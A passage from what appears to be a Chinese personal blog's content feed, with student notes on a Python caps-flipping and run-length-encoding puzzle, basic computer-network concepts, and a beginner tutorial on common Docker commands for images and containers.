caps[i]!=caps[i-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">if</span> caps[i]!=caps[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">if</span> caps[i-<span class="number">1</span>]==caps[i+<span class="number">1</span>]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;People in position &#x27;</span>,i,<span class="string">&#x27;filp your caps&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;People in postion&#x27;</span>,i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> caps[i]==caps[i-<span class="number">2</span>]:</span><br><span class="line">                    <span class="keyword">continue</span> </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;through&#x27;</span>,i-<span class="number">1</span>,<span class="string">&#x27;flip your caps&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="0x03-复杂问题"><a href="#0x03-复杂问题" class="headerlink" title="0x03 复杂问题"></a>0x03 复杂问题</h3><p>假设在队伍中存在没戴帽子的人。我们用字符’H’表示他们，不得令没戴帽子的人改变帽子方向，我们该怎么办</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cap3=[<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pleaseConformOnepass</span>(<span class="params">caps</span>):</span></span><br><span class="line">    start=backword=forword=<span class="number">0</span></span><br><span class="line">    intervals=[]</span><br><span class="line">    caps=caps+[<span class="string">&#x27;END&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(caps)):</span><br><span class="line">        <span class="keyword">if</span> caps[start]!=caps[i]:</span><br><span class="line">            intervals.append((start,i-<span class="number">1</span>,caps[start]))</span><br><span class="line">            <span class="keyword">if</span> caps[start]==<span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                forword+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> caps[start]== <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                backword+=<span class="number">1</span></span><br><span class="line">            start = i</span><br><span class="line">    <span class="keyword">if</span> backword&gt;=forword:</span><br><span class="line">        flipword=<span class="string">&#x27;F&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flipword=<span class="string">&#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> intervals:</span><br><span class="line">        <span class="keyword">if</span> t[<span class="number">2</span>] == flipword :</span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==t[<span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;people in postion&#x27;</span>,t[<span class="number">0</span>],<span class="string">&#x27;flip your caps!&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;people in postions&#x27;</span>,t[<span class="number">0</span>],<span class="string">&#x27;thourgh&#x27;</span>,t[<span class="number">1</span>],<span class="string">&#x27;flip your caps!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pleaseConformOnepass(cap3)</span><br></pre></td></tr></table></figure><p>这个跟基础问题感觉差距不大，都是组成一个区间性质列表</p><h3 id="0x04-实际编码问题"><a href="#0x04-实际编码问题" class="headerlink" title="0x04 实际编码问题"></a>0x04 实际编码问题</h3><p>如何把简单的’BBWWWWWZZZIIIIPPPP’编码为’2B5W3Z4I4P‘的形式呢</p><p>那又如何把’2B5W3Z4I4P‘解码为’BBWWWWWZZZIIIIPPPP’的形式呢</p><h4 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">string</span>):</span></span><br><span class="line">    string_list=<span class="built_in">list</span>(string)</span><br><span class="line">    <span class="comment">#print(string_list)</span></span><br><span class="line">    start=<span class="number">0</span></span><br><span class="line">    intervals=[]</span><br><span class="line">    end=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(string_list)):</span><br><span class="line">        <span class="keyword">if</span> string[start]!=string_list[i]:</span><br><span class="line">            intervals.append([<span class="built_in">str</span>(i-start),string_list[start]])</span><br><span class="line">            start=i</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> intervals:</span><br><span class="line">        end=end+<span class="string">&#x27;&#x27;</span>.join(t)</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="decoding"><a href="#decoding" class="headerlink" title="decoding"></a>decoding</h4>]]></content>
      
      
      <categories>
          
          <category> 用python解决算法谜题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础笔记</title>
      <link href="2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
      <url>2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>计算机网络基础，在阿里云大学学的，刚开始学</p><span id="more"></span><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><hr><h4 id="计算机网络概念"><a href="#计算机网络概念" class="headerlink" title="计算机网络概念"></a>计算机网络概念</h4><hr><p>计算机网络是自主计算机的互连集合</p><p>计算机网络是网络硬件和网络协议的统一体</p><h4 id="网络交换技术"><a href="#网络交换技术" class="headerlink" title="网络交换技术"></a>网络交换技术</h4><hr><p>有三种交换技术分别为电路交换 报文交换 分组交换</p><p><img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331166049.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331166049.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597331166049"></p><p>实现分组交换时的两个不同的分类方式</p><p>数据报方式<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331802481.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331802481.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597331802481"></p><p>虚电路方式</p><p><img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331917452.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597331917452.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597331917452"></p><h4 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h4><hr><ul><li><p>星型拓扑<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332012375.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332012375.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597332012375"></p></li><li><p>环形拓扑<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332055063.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332055063.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597332055063"></p></li><li><p>树形拓扑<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332093440.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332093440.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597332093440"></p></li><li><p>网状型拓扑<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332123102.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332123102.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597332123102"></p></li><li><p>总线型拓扑<img src="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332169138.png" class="lazyload" data-srcset="/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1597332169138.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597332169138"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker从入门到精通(二)</title>
      <link href="2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/"/>
      <url>2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>跟着狂神的课学docker感觉还不错，docker的常用命令打卡</p><span id="more"></span><h2 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h2><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version    #显示docker版本信息</span><br><span class="line">docker info       #显示docker的系统信息，包括镜像和容器的数量   </span><br><span class="line">docker 命令 --help #帮助命令</span><br></pre></td></tr></table></figure><h3 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h3><hr><p><strong>docker images</strong> 查看镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker images --help</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all images (default</span><br><span class="line">                        hides intermediate images)</span><br><span class="line">      --digests         Show digests</span><br><span class="line">  -f, --filter filter   Filter output based on</span><br><span class="line">                        conditions provided</span><br><span class="line">      --format string   Pretty-print images using a</span><br><span class="line">                        Go template</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br><span class="line">  -q, --quiet           Only show numeric IDs</span><br><span class="line"></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">nginx               latest              8cf1bfb43ff5        3 weeks ago         132MB</span><br><span class="line">mattrayner/lamp     latest              05750cfa54d5        3 weeks ago         915MB</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"><span class="meta">#</span><span class="bash">解释</span></span><br><span class="line">ERPOSITORY #镜像的仓库源</span><br><span class="line">TAG        #镜像的标签</span><br><span class="line">IMAGE ID   #镜像的id</span><br><span class="line">CREATED    #镜像的创建时间</span><br><span class="line">SIZE       #镜像的大小</span><br></pre></td></tr></table></figure><p><strong>docker search 搜索镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker search mysql</span><br><span class="line">NAME                              DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">mysql                             MySQL is a widely used, open-source relation…   9838                [OK]                </span><br><span class="line">mariadb                           MariaDB is a community-developed fork of MyS…   3591                [OK]                </span><br><span class="line"><span class="meta">#</span><span class="bash">可选项，通过收藏来过滤</span></span><br><span class="line">--filter=STARS=3000 #搜索出来的镜像stars数大于3000</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker search mysql --filter=stars=3000</span><br><span class="line">NAME                DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">mysql               MySQL is a widely used, open-source relation…   9838                [OK]                </span><br><span class="line">mariadb             MariaDB is a community-developed fork of MyS…   3591                [OK]      </span><br></pre></td></tr></table></figure><p><strong>docker pull 下载镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载镜像 docker pull 镜像名[:tag]</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker pull mysql</span><br><span class="line">Using default tag: latest #如果不写 tag，默认就是latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">bf5952930446: Pull complete #分层下载，docker images的核心 联合文件系统</span><br><span class="line">8254623a9871: Pull complete </span><br><span class="line">938e3e06dac4: Pull complete </span><br><span class="line">ea28ebf28884: Pull complete </span><br><span class="line">f3cef38785c2: Pull complete </span><br><span class="line">894f9792565a: Pull complete </span><br><span class="line">1d8a57523420: Pull complete </span><br><span class="line">6c676912929f: Pull complete </span><br><span class="line">ff39fdb566b4: Pull complete </span><br><span class="line">fff872988aba: Pull complete </span><br><span class="line">4d34e365ae68: Pull complete </span><br><span class="line">7886ee20621e: Pull complete </span><br><span class="line">Digest: sha256:c358e72e100ab493a0304bda35e6f239db2ec8c9bb836d8a427ac34307d074ed #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest #真实地址</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">bf5952930446: Already exists </span><br><span class="line">8254623a9871: Already exists </span><br><span class="line">938e3e06dac4: Already exists </span><br><span class="line">ea28ebf28884: Already exists </span><br><span class="line">f3cef38785c2: Already exists </span><br><span class="line">894f9792565a: Already exists </span><br><span class="line">1d8a57523420: Already exists </span><br><span class="line">5f09bf1d31c1: Pull complete </span><br><span class="line">1b6ff254abe7: Pull complete </span><br><span class="line">74310a0bf42d: Pull complete </span><br><span class="line">d398726627fd: Pull complete </span><br><span class="line">Digest: sha256:da58f943b94721d46e87d5de208dc07302a8b13e638cd1d24285d222376d6d84</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597386433671.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597386433671.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597386433671"></p><p><strong>docker rmi 删除镜像！</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f 容器id #删除指定的容器</span><br><span class="line">docker rmi -f 容器id 容器id 容器id 容器id #删除多个容器</span><br><span class="line">docker rmi -f $(docker images -aq) #删除全部的容器</span><br></pre></td></tr></table></figure><h3 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h3><hr><p><strong>说明：我们有了镜像才可以创建容器，linux，下载一个centos镜像来测试学习</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><p><strong>新建容器并启动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">参数说明</span></span><br><span class="line">--name=“Name”  容器命名 tomcat01，tomcat02，用来区分容器</span><br><span class="line">-d             后台方式运行</span><br><span class="line">-it            使用交互方式运行 进入容器查看内容</span><br><span class="line">-p             指定容器的端口 -p 8080:8080</span><br><span class="line">      #-p ip:主机端口：容器端口</span><br><span class="line">      #-p 容器端口：容器端口</span><br><span class="line">      #-p 容器端口</span><br><span class="line">      #容器端口</span><br><span class="line">-P             随机指定端口</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">测试，启动并进入容器</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@3d988e323015 /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">从容器中退回到服务器</span></span><br><span class="line">[root@3d988e323015 /]# exit</span><br><span class="line">exit</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# ls</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# cd ../</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p><strong>列出所有的运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">docker ps 列出当前正在运行的容器</span></span><br><span class="line">-a #列出当前正在运行的容器+历史运行过的容器</span><br><span class="line">-n=？  #显示最近创建的容器</span><br><span class="line">-q #只显示容器的编号</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                          NAMES</span><br><span class="line">8d22f31c06c3        mattrayner/lamp     &quot;/run.sh&quot;           8 days ago          Up 8 days           0.0.0.0:80-&gt;80/tcp, 3306/tcp   web_xiazhu</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS                          NAMES</span><br><span class="line">3d988e323015        centos              &quot;/bin/bash&quot;         4 minutes ago       Exited (0) 2 minutes ago                                  youthful_kirch</span><br><span class="line">8d1772abc79e        hello-world         &quot;/hello&quot;            46 hours ago        Exited (0) 46 hours ago                                   xenodochial_noyce</span><br><span class="line">8d22f31c06c3        mattrayner/lamp     &quot;/run.sh&quot;           8 days ago          Up 8 days                  0.0.0.0:80-&gt;80/tcp, 3306/tcp   web_xiazhu</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>退出容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit #退出容器停止并退出</span><br><span class="line">Ctrl + P+Q #容器不停止退出</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id               #删除指定的容器,不能删除正在运行的容器，需要加-f</span><br><span class="line">docker rm -f $(docker ps -aq) #删除所有容器</span><br><span class="line">docker ps -a -q|xargs docker rm #删除若有容器</span><br></pre></td></tr></table></figure><p><strong>启动和停止容器的操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id   #启动容器</span><br><span class="line">docker restart 容器id #重启容器 </span><br><span class="line">docker stop 容器id    #停止容器</span><br><span class="line">docker kill 容器id    #强制停止当前容器</span><br></pre></td></tr></table></figure><h3 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h3><hr><p><strong>后台启动容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令 docker run -d 镜像名！</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# docker run -d centos</span><br><span class="line"><span class="meta">#</span><span class="bash">问题 docker ps。发现centos 停止了</span></span><br><span class="line"><span class="meta">#</span><span class="bash">常见的坑:docker 容器使用后台运行，就必须要有一个前台的进程，docker发现没有应用，就会自动停止</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nginx，容器启动后，发现没有提供服务，就会立刻停止，就是没有程序了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>查看日志</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tail 容器id </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果容器没有日志，自己编写了一段shell脚本</span></span><br><span 